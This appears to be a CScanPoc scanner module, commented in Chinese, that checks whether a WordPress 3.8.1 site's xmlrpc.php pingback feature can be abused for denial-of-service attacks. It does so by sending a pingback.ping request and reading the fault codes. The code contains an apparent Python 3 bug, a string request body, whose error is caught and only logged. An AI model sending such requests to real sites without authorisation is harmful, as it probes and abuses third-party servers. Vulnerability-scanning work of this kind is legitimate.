# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re


class Vuln(ABVuln):
    vuln_id = 'WordPress_0075'  # 平台漏洞编号，留空
    name = 'WordPress 3.8.1 /xmlrpc.php 拒绝服务漏洞'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2014-03-10'  # 漏洞公布时间
    desc = '''
        WordPress是一个基于PHP和MySQL的免费开源内容管理系统（CMS）。功能包括插件架构和模板系统。它与博客最相关，但支持其他类型的网络内容，包括更传统的邮件列表和论坛，媒体画廊和在线商店。截至2018年4月，超过6000万个网站使用，包括前1000万个网站的30.6％，WordPress是最受欢迎的网站管理系统正在使用中。WordPress也被用于其他应用领域，如普适显示系统（PDS）。
        WordPress 3.8.1 /xmlrpc.php 文件有ping其他主机的功能，通过这个功能可以请求攻击别的网站。
    '''  # 漏洞描述
    ref = 'https://blog.sucuri.net/2014/03/more-than-162000-wordpress-sites-used-for-distributed-denial-of-service-attack.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = '3.8.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e29a4351-8d26-4959-b873-28a8e8a275f2'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            xml_url = '{target}'.format(target=self.target) + '/xmlrpc.php'
            page_url = '{target}'.format(target=self.target) + '/?p=2'
            post_content = ("<methodCall><methodName>pingback.ping</methodName><params><param>"
                            "<value><string>http://127.0.0.1</string></value></param><param>"
                            "<value><string>%s</string></value></param></params></methodCall>")
            post_content = post_content % (page_url)

            request = urllib.request.Request(xml_url, post_content)
            response = urllib.request.urlopen(request)
            page_content = str(response.read())
            if '<methodResponse>' in page_content:
                if ('>17<' in page_content) or ('>32<' in page_content):
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
